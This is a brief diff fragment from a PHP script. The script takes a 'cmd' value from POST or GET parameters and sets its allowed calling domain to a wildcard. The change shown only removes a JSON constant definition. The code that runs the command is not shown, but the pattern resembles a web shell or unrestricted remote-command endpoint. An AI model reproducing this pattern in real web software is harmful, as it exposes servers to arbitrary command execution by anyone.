@@ -6,7 +6,6 @@ if(@$_POST['cmd']){
 }elseif(@$_GET['cmd']){
     $command=$_GET['cmd'];
 }
-if(@JSON_UNESCAPED_UNICODE)define('JSON_UNESCAPED_UNICODE',0);
 if ($command) {
     //设置允许使用命令的域
     $allow=@domainname?@domainname:"*";
